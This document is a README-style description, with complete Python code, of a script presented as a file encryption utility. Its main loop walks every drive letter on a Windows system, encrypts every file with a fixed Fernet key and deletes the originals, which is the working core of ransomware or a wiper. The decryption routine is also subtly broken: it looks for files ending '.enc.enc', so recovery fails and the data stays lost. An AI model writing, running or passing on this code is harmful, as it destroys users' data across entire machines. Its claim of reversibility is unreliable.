### Overview

This script provides functionality for encrypting and decrypting files on a specified drive using the Fernet symmetric encryption algorithm. The script lists all available drives, iterates through them to encrypt or decrypt files, and handles both file content and file extensions.

### Dependencies

- `cryptography`: For encryption and decryption (install with `pip install cryptography`).
- `os`: For file and directory operations.

### Features

1. **Drive Listing**:
   - Lists available drives on the system.

2. **File Listing**:
   - Retrieves all files from a specified directory and its subdirectories.

3. **Encryption**:
   - Encrypts files using a predefined Fernet key.
   - Saves encrypted files with a `.enc` extension.

4. **Decryption**:
   - Decrypts files previously encrypted with the `.enc` extension.
   - Restores the original files by removing the `.enc` extension.

### How It Works

1. **Encryption Key**:
   - A predefined key is used for the Fernet encryption algorithm. Replace the placeholder key with your own key.

2. **Drive and File Listing**:
   - The `list_all_drives` function identifies available drives.
   - The `list_all_files` function retrieves all files from a given directory.

3. **File Encryption**:
   - The `encrypt_files` function encrypts each file's content and saves it with a `.enc` extension. The original file is deleted after encryption.

4. **File Decryption**:
   - The `decrypt_files` function decrypts files with a `.enc` extension and restores the original file.

### Code Details

- **Imports**:
  - `cryptography.fernet` for encryption and decryption.
  - `os` for file system operations.

- **Encryption Key Setup**:
  ```python
    # Encryption key
    key = 'your-encryption-key-here'
    cipher = Fernet(key.encode())
  ```

- **List Drives Function**:
  ```python
    # List all drives
    def list_all_drives():
        drives = []
        for letter in range(ord('A'), ord('Z') + 1):
            drive = chr(letter) + ':\\'
            if os.path.isdir(drive):
                drives.append(drive)
        return drives
  ```

- **List Files Function**:
  ```python
    # List all files in a directory
    def list_all_files(directory):
        all_files = []
        for root, _, files in os.walk(directory):
            for file in files:
                all_files.append(os.path.join(root, file))
        return all_files
  ```

- **Encrypt Files Function**:
  ```python
    # Encrypt files
    def encrypt_files(directory):
        files = list_all_files(directory)
        for file_path in files:
            try:
                with open(file_path, 'rb') as file:
                    data = file.read()
                encrypted_data = cipher.encrypt(data)
                os.remove(file_path)
                with open(file_path + '.enc', 'wb') as file:
                    file.write(encrypted_data)
                print(f"Encrypted {file_path} to {file_path}.enc")
            except Exception as e:
                print(f"Failed to encrypt {file_path}: {e}")
  ```

- **Decrypt Files Function**:
  ```python
    # Decrypt files
    def decrypt_files(directory):
        files = list_all_files(directory)
        for file_path in files:
            enc_file_path = file_path + '.enc'
            if os.path.exists(enc_file_path):
                try:
                    with open(enc_file_path, 'rb') as file:
                        encrypted_data = file.read()
                    decrypted_data = cipher.decrypt(encrypted_data)
                    os.remove(enc_file_path)
                    with open(file_path, 'wb') as file:
                        file.write(decrypted_data)
                    print(f"Decrypted {enc_file_path} to {file_path}")
                except Exception as e:
                    print(f"Failed to decrypt {enc_file_path}: {e}")
  ```

- **Processing Drives**:
  ```python
    # Process all drives
    for drive in list_all_drives():
        print(f"Processing drive: {drive}")
        encrypt_files(drive)
        # Uncomment the line below to enable decryption
        # decrypt_files(drive)
  ```

### Usage

1. **Encryption**:
   - To encrypt files, run the script as follows:
     ```python
     for drive in list_all_drives():
         print(f"Processing drive: {drive}")
         encrypt_files(drive)
     ```

2. **Decryption**:
   - To decrypt files, uncomment the decryption line in the main loop:
     ```python
     # decrypt_files(drive)
     ```

### Important Notes

- **Encryption Key**:
  - Ensure that the key used for encryption and decryption is securely stored and is the same for both operations.

- **Security**:
  - Be cautious when handling encryption and decryption operations to avoid data loss or corruption.
